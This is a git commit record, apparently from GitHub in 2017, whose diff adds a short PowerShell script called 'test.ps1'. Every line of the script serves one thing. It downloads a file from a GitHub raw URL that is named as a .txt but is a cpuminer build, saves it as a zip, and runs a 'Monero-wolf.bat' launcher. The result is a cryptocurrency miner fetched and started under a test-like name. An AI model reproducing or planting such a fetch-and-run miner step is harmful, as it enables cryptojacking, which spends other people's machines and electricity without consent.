3c9b2e8b2894bb6e59524aa5129f1a0cf31504d2
nguyenvanvu <mr.vunguyen.it@gmail.com>
2017-09-23 21:17:09 -0700

    Add files via upload

--- test.ps1
+++ test.ps1
@@ -1,1 +1,4 @@
-cd ~;mkdir c:\testdasdasda;
+mkdir c:\ngvudev
+cd c:\ngvudev
+wget raw.githubusercontent.com/nguyenvanvu/247Tool/master/cpuminer-multi-wolf-05-30-2014.txt -O aa.zip
+.\Monero-wolf.bat
